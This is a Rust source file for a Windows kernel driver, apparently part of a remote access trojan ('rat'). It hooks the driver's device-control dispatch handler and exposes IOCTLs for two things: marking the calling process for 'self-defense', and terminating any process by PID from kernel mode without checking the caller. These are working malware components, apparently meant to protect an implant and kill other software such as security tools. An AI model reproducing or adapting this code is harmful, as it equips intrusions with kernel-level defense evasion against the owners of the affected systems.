use core::sync::atomic::{AtomicPtr, Ordering};
use core::{mem, ptr, slice};

use rat_common::utils::DropGuard;
use rat_common::windows::{IOCTL_START_DEFENSE, IOCTL_TERMINATE};
use wdk::nt_success;
use wdk_sys::_MODE::KernelMode;
use wdk_sys::ntddk::{
    IoCreateDevice, IoCreateSymbolicLink, IofCompleteRequest, ObOpenObjectByPointer,
    ObfDereferenceObject, PsGetCurrentProcessId, PsLookupProcessByProcessId, RtlInitUnicodeString,
    ZwClose, ZwTerminateProcess,
};
use wdk_sys::{
    DEVICE_OBJECT, DO_BUFFERED_IO, DO_DEVICE_INITIALIZING, FILE_DEVICE_SECURE_OPEN,
    FILE_DEVICE_UNKNOWN, HANDLE, IO_NO_INCREMENT, IO_STACK_LOCATION, IRP, IRP_MJ_DEVICE_CONTROL,
    NTSTATUS, OBJ_KERNEL_HANDLE, PDEVICE_OBJECT, PDRIVER_OBJECT, PIRP, STATUS_INVALID_PARAMETER,
    STATUS_SUCCESS, STATUS_UNSUCCESSFUL, UNICODE_STRING,
};

use crate::cleanup::cleanup_device;
use crate::global::{DEVICE_NAME, DOS_NAME, RAT_DEVICE_OBJECT, SELF_DEFENSE_PIDS};
use crate::wrappers::bindings::IoGetCurrentIrpStackLocation;
use crate::{error, info, warn};

type IrpHandler = unsafe extern "C" fn(PDEVICE_OBJECT, PIRP) -> NTSTATUS;

static _OLD_DEVICE_CONTROL_HANDLER: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());

struct _CleanupOnDrop {
    pub device: PDEVICE_OBJECT,
}

impl Drop for _CleanupOnDrop {
    fn drop(&mut self) {
        cleanup_device(self.device);
    }
}

pub fn create_device(driver: PDRIVER_OBJECT) -> anyhow::Result<PDEVICE_OBJECT> {
    match unsafe { driver.as_mut() } {
        Some(driver) => {
            if let Some(handler) = driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] {
                _OLD_DEVICE_CONTROL_HANDLER.store(handler as *mut u8, Ordering::Release);
            }

            driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] = Some(device_control_handler);
        }
        None => {
            anyhow::bail!("A null pointer is provided to create_device");
        }
    }

    let mut dos_name = UNICODE_STRING::default();
    let mut device_name = UNICODE_STRING::default();
    unsafe {
        RtlInitUnicodeString(&mut dos_name, DOS_NAME.as_ptr());
        RtlInitUnicodeString(&mut device_name, DEVICE_NAME.as_ptr());
    }

    let mut device = ptr::null_mut();
    let status = unsafe {
        IoCreateDevice(
            driver,
            0,
            &mut device_name,
            FILE_DEVICE_UNKNOWN,
            FILE_DEVICE_SECURE_OPEN,
            0,
            &mut device,
        )
    };

    anyhow::ensure!(nt_success(status), "IoCreateDevice error: 0x{status:X}");

    let mut guard = _CleanupOnDrop { device };

    if let Some(device) = unsafe { device.as_mut() } {
        device.Flags |= DO_BUFFERED_IO;
        device.Flags &= !DO_DEVICE_INITIALIZING;
    }

    let status = unsafe { IoCreateSymbolicLink(&mut dos_name, &mut device_name) };
    anyhow::ensure!(
        nt_success(status),
        "IoCreateSymbolicLink error: 0x{status:X}",
    );

    guard.device = ptr::null_mut(); // Prevent cleanup on drop
    Ok(device)
}

unsafe extern "C" fn device_control_handler(device: PDEVICE_OBJECT, irp: PIRP) -> NTSTATUS {
    let our_device = RAT_DEVICE_OBJECT.load(Ordering::Acquire);
    if device == our_device {
        let device = match unsafe { device.as_ref() } {
            Some(d) => d,
            None => {
                warn!("irp_handler: PDEVICE_OBJECT is null");
                return STATUS_INVALID_PARAMETER;
            }
        };

        let irp = match unsafe { irp.as_mut() } {
            Some(i) => i,
            None => {
                warn!("irp_handler: PIRP is null");
                return STATUS_INVALID_PARAMETER;
            }
        };

        let irpsp = match unsafe { IoGetCurrentIrpStackLocation(irp).as_mut() } {
            Some(s) => s,
            None => {
                warn!("irp_handler: Failed to call IoGetCurrentIrpStackLocation");
                return STATUS_INVALID_PARAMETER;
            }
        };

        // Handle our custom IOCTLs here
        let status = device_control_notify(device, irp, irpsp);
        irp.IoStatus.__bindgen_anon_1.Status = status;
        unsafe {
            IofCompleteRequest(irp, IO_NO_INCREMENT as i8);
        }
        status
    } else {
        let old_handler = _OLD_DEVICE_CONTROL_HANDLER.load(Ordering::Acquire);
        if old_handler.is_null() {
            return STATUS_UNSUCCESSFUL;
        }

        unsafe {
            let handler = mem::transmute::<*mut u8, IrpHandler>(old_handler);
            handler(device, irp)
        }
    }
}

fn device_control_notify(
    _: &DEVICE_OBJECT,
    irp: &mut IRP,
    irpsp: &mut IO_STACK_LOCATION,
) -> NTSTATUS {
    match unsafe { irpsp.Parameters.DeviceIoControl.IoControlCode } {
        IOCTL_START_DEFENSE => {
            let pid = unsafe { PsGetCurrentProcessId() };

            match unsafe { SELF_DEFENSE_PIDS.load(Ordering::Acquire).as_ref() } {
                Some(lock) => {
                    info!("Activating self-defense for process {}", pid as usize);
                    let mut set = lock.lock();
                    set.insert(pid);

                    STATUS_SUCCESS
                }
                None => {
                    error!("Cannot activate self-defense for process {}", pid as usize);
                    STATUS_UNSUCCESSFUL
                }
            }
        }
        IOCTL_TERMINATE => {
            let buffer = unsafe {
                slice::from_raw_parts(
                    irp.AssociatedIrp.SystemBuffer.cast::<u8>(),
                    irpsp.Parameters.DeviceIoControl.InputBufferLength as usize,
                )
            };

            let buffer = match buffer.try_into() {
                Ok(b) => b,
                Err(_) => {
                    return STATUS_INVALID_PARAMETER;
                }
            };

            let pid = usize::from_le_bytes(buffer);

            let mut process = ptr::null_mut();
            let status = unsafe { PsLookupProcessByProcessId(pid as HANDLE, &mut process) };
            if !nt_success(status) {
                return status;
            }

            let guard1 = DropGuard::new(process, |p| unsafe {
                ObfDereferenceObject(p.cast());
            });

            let mut handle = ptr::null_mut();
            let status = unsafe {
                ObOpenObjectByPointer(
                    process.cast(),
                    OBJ_KERNEL_HANDLE,
                    ptr::null_mut(),
                    0,
                    ptr::null_mut(),
                    KernelMode as i8,
                    &mut handle,
                )
            };
            if !nt_success(status) {
                return status;
            }

            let guard2 = DropGuard::new(handle, |h| unsafe {
                let _ = ZwClose(h);
            });

            let status = unsafe { ZwTerminateProcess(handle, 0) };

            drop(guard2);
            drop(guard1);
            status
        }
        code => {
            error!("Unknown IOCTL code: 0x{code:X}");
            STATUS_INVALID_PARAMETER
        }
    }
}
